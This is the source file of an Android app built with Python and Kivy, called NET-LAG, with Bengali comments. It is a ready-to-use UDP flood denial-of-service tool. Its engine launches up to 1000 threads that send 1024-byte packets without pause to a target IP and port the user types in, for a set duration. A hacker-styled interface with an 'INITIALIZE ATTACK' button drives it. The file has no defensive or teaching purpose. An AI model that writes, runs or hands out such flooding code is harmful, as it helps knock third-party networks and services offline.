import socket
import threading
import time
import random
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.popup import Popup
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock
from kivy.graphics import Color, Rectangle, Line
from kivy.core.window import Window
from kivy.properties import NumericProperty, StringProperty, BooleanProperty

# স্ক্রিন অন রাখার জন্য jnius (Android Only)
try:
    from jnius import autoclass
    from android.runnable import run_on_ui_thread
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    activity = PythonActivity.mActivity
    WindowManager = autoclass('android.view.WindowManager')
    FLAG_KEEP_SCREEN_ON = WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
except ImportError:
    pass # পিসিতে টেস্ট করার সময় এরর দেবে না

# ---------- নেটওয়ার্ক ইঞ্জিন ----------
class NetLagEngine:
    def __init__(self, update_callback):
        self.update_callback = update_callback
        self.running = False
        self.packets_sent = 0
        self.threads = []
        self.target_ip = ""
        self.target_port = 80
        self.packet_size = 1024
        self.duration = 30

    def start(self, ip, port, threads, packet_size, duration):
        self.target_ip = ip
        self.target_port = port
        self.packet_size = packet_size
        self.duration = duration
        self.packets_sent = 0
        self.running = True
        self.start_time = time.time()
        
        # স্ক্রিন অন রাখা
        self.keep_screen_on(True)

        # থ্রেড তৈরি
        self.threads = []
        for _ in range(threads):
            t = threading.Thread(target=self._flood)
            t.daemon = True
            self.threads.append(t)
            t.start()

        # UI আপডেট
        Clock.schedule_interval(self._update_ui, 0.5)

    def stop(self):
        self.running = False
        self.keep_screen_on(False)
        self.update_callback(">>> ATTACK STOPPED BY USER.")

    def _flood(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = b'X' * self.packet_size
        while self.running:
            if time.time() - self.start_time >= self.duration:
                self.running = False
                self.keep_screen_on(False)
                Clock.schedule_once(lambda dt: self.update_callback(">>> DURATION REACHED. STOPPING."), 0)
                break
            try:
                sock.sendto(data, (self.target_ip, self.target_port))
                self.packets_sent += 1
            except Exception as e:
                pass
        sock.close()

    def _update_ui(self, dt):
        if not self.running:
            Clock.unschedule(self._update_ui)
            return
        self.update_callback(f"> Packets sent: {self.packets_sent} | Threads: {len(self.threads)}")

    def keep_screen_on(self, enable):
        try:
            if enable:
                @run_on_ui_thread
                def keep_on():
                    activity.getWindow().addFlags(FLAG_KEEP_SCREEN_ON)
                keep_on()
            else:
                @run_on_ui_thread
                def keep_off():
                    activity.getWindow().clearFlags(FLAG_KEEP_SCREEN_ON)
                keep_off()
        except Exception:
            pass # পিসিতে রান করলে ইগনোর করবে

# ---------- UI লেআউট ----------
class MainLayout(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.padding = 15
        self.spacing = 10

        # ভ্যারিয়েবল
        self.target_ip = self.get_local_ip()
        self.threads = 100
        self.port = 80
        self.packet_size = 1024
        self.duration = 30
        self.engine = NetLagEngine(self.update_log)
        
        # ১. টাইটেল (Glitch Effect)
        self.title_label = Label(
            text="N E T - L A G", 
            font_size='35sp', 
            bold=True, 
            color=(0, 1, 0, 1), # Neon Green
            size_hint_y=None, 
            height=60
        )
        self.add_widget(self.title_label)

        # ২. স্ট্যাটাস গ্রিড (৩টি বক্স)
        status_grid = GridLayout(cols=3, spacing=10, size_hint_y=None, height=80)
        
        self.ip_box = self.create_status_box("TARGET", self.target_ip)
        self.thread_box = self.create_status_box("THREADS", str(self.threads))
        self.packet_box = self.create_status_box("PACKETS", "0")
        
        status_grid.add_widget(self.ip_box)
        status_grid.add_widget(self.thread_box)
        status_grid.add_widget(self.packet_box)
        self.add_widget(status_grid)

        # ৩. স্ক্যানিং অ্যানিমেশন এরিয়া (Canvas)
        self.scan_area = BoxLayout(size_hint_y=0.2)
        with self.scan_area.canvas:
            Color(0.1, 0.1, 0.1, 1) # Dark background
            self.scan_bg = Rectangle(pos=self.scan_area.pos, size=self.scan_area.size)
            Color(0, 1, 0, 0.5) # Neon Green scanner
            self.scan_line = Line(points=[self.scan_area.x, self.scan_area.y, self.scan_area.right, self.scan_area.y], width=2)
        
        self.scan_y = 0
        self.scan_direction = 1
        Clock.schedule_interval(self.animate_scan, 0.02)
        self.add_widget(self.scan_area)

        # ৪. টার্মিনাল লগ এরিয়া
        self.log_scroll = ScrollView()
        self.log_label = Label(
            text="> SYSTEM INITIALIZED...\n> WAITING FOR COMMANDS...\n", 
            font_size='12sp', 
            color=(0, 1, 0, 1), 
            halign='left', 
            valign='top',
            size_hint_y=None
        )
        self.log_label.bind(texture_size=self.log_label.setter('size'))
        self.log_scroll.add_widget(self.log_label)
        self.add_widget(self.log_scroll)

        # ৫. অ্যাকশন বাটন এবং কনফিগ
        btn_grid = GridLayout(cols=2, spacing=10, size_hint_y=None, height=60)
        
        self.config_btn = Button(text="CONFIG", background_color=(0, 0.5, 0, 1))
        self.config_btn.bind(on_press=self.open_config)
        
        self.action_btn = Button(text="INITIALIZE ATTACK", background_color=(0, 0.8, 0, 1))
        self.action_btn.bind(on_press=self.toggle_attack)
        
        btn_grid.add_widget(self.config_btn)
        btn_grid.add_widget(self.action_btn)
        self.add_widget(btn_grid)

        # Glitch অ্যানিমেশন শুরু
        Clock.schedule_interval(self.glitch_title, 0.1)

    def create_status_box(self, title, value):
        box = BoxLayout(orientation='vertical', size_hint_y=None, height=80)
        lbl_title = Label(text=title, font_size='10sp', color=(0.7, 0.7, 0.7, 1))
        lbl_value = Label(text=value, font_size='14sp', bold=True, color=(0, 1, 0, 1))
        box.add_widget(lbl_title)
        box.add_widget(lbl_value)
        return box

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def glitch_title(self, dt):
        # টাইটেলের পজিশন হঠাৎ করে এলোমেলো করা (Glitch Effect)
        if random.random() > 0.8:
            self.title_label.x = random.randint(-5, 5)
            self.title_label.color = (1, 0, 0, 1) if random.random() > 0.5 else (0, 1, 1, 1)
        else:
            self.title_label.x = 0
            self.title_label.color = (0, 1, 0, 1)

    def animate_scan(self, dt):
        if not self.scan_area.canvas: return
        self.scan_y += self.scan_direction * (self.scan_area.height * 0.05)
        if self.scan_y > self.scan_area.height or self.scan_y < 0:
            self.scan_direction *= -1
        
        self.scan_line.points = [
            self.scan_area.x, self.scan_area.y + self.scan_y, 
            self.scan_area.right, self.scan_area.y + self.scan_y
        ]

    def update_log(self, message):
        # UI থ্রেডে লগ আপডেট করা
        Clock.schedule_once(lambda dt: self._append_log(message), 0)

    def _append_log(self, message):
        self.log_label.text += message + "\n"
        self.log_scroll.scroll_y = 0

    def toggle_attack(self, instance):
        if not self.engine.running:
            # অ্যাটাক শুরু
            if self.threads > 1000:
                self.update_log("> WARNING: THREAD LIMIT EXCEEDED! (MAX 1000)")
                return
            self.update_log(f"> STARTING ATTACK ON {self.target_ip}:{self.port}")
            self.update_log(f"> Threads: {self.threads} | Duration: {self.duration}s")
            self.engine.start(self.target_ip, self.port, self.threads, self.packet_size, self.duration)
            self.action_btn.text = "STOP ATTACK"
            self.action_btn.background_color = (0.8, 0, 0, 1) # Red
        else:
            # অ্যাটাক বন্ধ
            self.engine.stop()
            self.action_btn.text = "INITIALIZE ATTACK"
            self.action_btn.background_color = (0, 0.8, 0, 1) # Green

    def open_config(self, instance):
        # কনফিগ পপ-আপ
        content = BoxLayout(orientation='vertical', spacing=10, padding=10)
        
        content.add_widget(Label(text="Enter Target IP:"))
        ip_input = TextInput(text=self.target_ip, multiline=False)
        content.add_widget(ip_input)
        
        content.add_widget(Label(text="Enter Port:"))
        port_input = TextInput(text=str(self.port), multiline=False, input_filter='int')
        content.add_widget(port_input)

        content.add_widget(Label(text="Enter Threads (Max 1000):"))
        thread_input = TextInput(text=str(self.threads), multiline=False, input_filter='int')
        content.add_widget(thread_input)

        content.add_widget(Label(text="Enter Duration (Seconds):"))
        duration_input = TextInput(text=str(self.duration), multiline=False, input_filter='int')
        content.add_widget(duration_input)

        save_btn = Button(text="SAVE", size_hint_y=None, height=50, background_color=(0, 0.8, 0, 1))
        content.add_widget(save_btn)

        popup = Popup(title="CONFIGURATION", content=content, size_hint=(0.9, 0.8))
        save_btn.bind(on_press=lambda x: self.save_config(ip_input.text, port_input.text, thread_input.text, duration_input.text, popup))
        popup.open()

    def save_config(self, ip, port, threads, duration, popup):
        try:
            self.target_ip = ip
            self.port = int(port)
            self.threads = int(threads)
            self.duration = int(duration)
            
            # UI আপডেট
            self.ip_box.children[0].text = self.target_ip
            self.thread_box.children[0].text = str(self.threads)
            
            if self.threads > 1000:
                self.update_log("> WARNING: Threads > 1000! Attack will be disabled.")
            else:
                self.update_log("> CONFIGURATION SAVED.")
                
            popup.dismiss()
        except ValueError:
            self.update_log("> ERROR: INVALID INPUT DATA.")

class NetLagApp(App):
    def build(self):
        Window.clearcolor = (0.05, 0.05, 0.05, 1) # Dark Theme
        return MainLayout()

if __name__ == '__main__':
    NetLagApp().run()
